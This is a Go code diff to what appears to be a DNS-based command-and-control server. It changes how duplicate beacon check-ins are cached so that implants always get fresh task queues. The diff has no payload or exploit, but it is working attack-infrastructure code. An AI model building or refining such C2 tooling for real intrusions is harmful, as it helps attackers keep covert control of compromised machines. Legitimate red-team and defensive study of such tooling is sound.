@@ -780,28 +780,36 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	msgHash := fmt.Sprintf("%x", sha256.Sum256([]byte(decoded)))
 	isDuplicate := false
 
+	// Extract message type FIRST to determine if caching applies
+	messageType := strings.SplitN(decoded, "|", 2)[0]
+
 	c2.mutex.Lock()
 	if lastSeen, exists := c2.recentMessages[msgHash]; exists {
 		isDuplicate = true
-		// Check if we have a cached response for this duplicate
-		if cachedResp, hasCached := c2.cachedResponses[msgHash]; hasCached {
-			c2.mutex.Unlock()
-			if c2.debug {
-				logf("[DEBUG] Duplicate message detected (seen %v ago), returning cached response", time.Since(lastSeen))
+		// IMPORTANT: Don't use cached responses for CHK/CHECKIN - task queues are dynamic
+		if messageType != "CHK" && messageType != "CHECKIN" {
+			// Check if we have a cached response for this duplicate
+			if cachedResp, hasCached := c2.cachedResponses[msgHash]; hasCached {
+				c2.mutex.Unlock()
+				if c2.debug {
+					logf("[DEBUG] Duplicate message detected (seen %v ago), returning cached response", time.Since(lastSeen))
+				}
+				return cachedResp, true
 			}
-			return cachedResp, true
 		}
 		c2.mutex.Unlock()
 		if c2.debug {
-			logf("[DEBUG] Duplicate message detected (seen %v ago)", time.Since(lastSeen))
+			if messageType == "CHK" || messageType == "CHECKIN" {
+				logf("[DEBUG] Duplicate CHK detected (seen %v ago), but processing fresh for task queue check", time.Since(lastSeen))
+			} else {
+				logf("[DEBUG] Duplicate message detected (seen %v ago)", time.Since(lastSeen))
+			}
 		}
 	} else {
 		// Mark new message as seen
 		c2.recentMessages[msgHash] = time.Now()
 		c2.mutex.Unlock()
 	}
-
-	messageType := strings.SplitN(decoded, "|", 2)[0]
 	var response string
 	var validMessage bool
 
@@ -841,7 +849,9 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		if len(parts) < 5 {
 			return "", false
 		}
-		response = c2.handleCheckin(parts, clientIP, isDuplicate)
+		// Don't treat checkins as duplicates - task queues are dynamic
+		// Always process checkin to check for new tasks
+		response = c2.handleCheckin(parts, clientIP, false)
 		validMessage = true
 
 	case "RESULT":
@@ -879,7 +889,8 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	}
 
 	// Cache the response for duplicate handling (only if not a duplicate itself)
-	if validMessage && !isDuplicate && response != "" {
+	// IMPORTANT: Don't cache CHK/CHECKIN responses - task queues are dynamic
+	if validMessage && !isDuplicate && response != "" && messageType != "CHK" && messageType != "CHECKIN" {
 		c2.mutex.Lock()
 		c2.cachedResponses[msgHash] = response
 		c2.mutex.Unlock()
